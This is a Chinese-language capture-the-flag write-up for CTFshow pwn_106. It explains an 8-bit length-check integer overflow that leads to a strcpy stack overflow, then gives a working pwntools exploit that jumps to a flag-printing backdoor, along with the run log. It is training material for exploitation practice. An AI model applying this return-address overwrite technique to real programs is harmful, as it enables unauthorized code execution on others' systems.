# CTFshow-pwn_106
1. 题目来源：CTFshow题库（本地环境）
2. PWN + 整数安全（整数溢出 + 栈溢出）
## 解题思路
> 整数溢出 + ret2text （同pwn_106）

仅开启 NX 保护
```text
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ checksec pwn_106
[*] '/home/mrw/CTFshow/pwn_106'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

程序在主函数中读入一个整数，若为1则执行 `login` 可以读入长度最长为0x199的 `passwd` 字符串
```c
char *login()
{
  char s[40]; // [esp+8h] [ebp-230h] BYREF
  char buf[516]; // [esp+30h] [ebp-208h] BYREF

  memset(s, 0, sizeof(s));
  memset(buf, 0, 0x200u);
  puts("Please input your username:");
  read(0, s, 0x19u);
  printf("Hello %s\n", s);
  puts("Please input your passwd:");
  read(0, buf, 0x199u);
  return check_passwd(buf);
}
```
`check_passwd` 中存在同 `pwn_105`的漏洞点  
```c
char *__cdecl check_passwd(char *s)
{
  char dest[11]; // [esp+4h] [ebp-14h] BYREF
  unsigned __int8 v3; // [esp+Fh] [ebp-9h]

  v3 = strlen(s);
  if ( v3 > 3u && v3 <= 8u )
  {
    puts("Success");
    fflush(stdout);
    return strcpy(dest, s);
  }
  else
  {
    puts("Invalid Password");
    return (char *)fflush(stdout);
  }
}
```

程序中存在后门函数 `fffflag`   
```c
int fffflag()
{
  return system("cat /ctfshow_flag");
}
``` 

**exp 如下**  
```python
from pwn import *
p = process('./pwn_106')
p.sendline(b'1')
p.send(b'a'*0x19)
p.send((b'a'*0x18+p32(0x08048919)).ljust(0x105, b'a') + b'\x00')
p.interactive()
```

## Flag
> 题目在本地运行， flag自己随便设的
运行结果如下
```text
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ python3 ./exp/pwn_106.py 
[+] Starting local process './pwn_106': pid 18727
[*] Switching to interactive mode
    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           
  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           
 ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
 ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
 ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ 
  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ 
    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  
    * *************************************                           
    * Classify: CTFshow --- PWN --- 入门                              
    * Type  : Integer_Overflow                                        
    * Site  : https://ctf.show/                                       
    * Hint  : Find the danger function !                              
    * *************************************                           
1.login
2.quit
Your choice:Please input your username:
Hello aaaaaaaaaaaaaaaaaaaaaaaaa
Please input your passwd:
Success
flag{Success!}
[*] Got EOF while reading in interactive
```
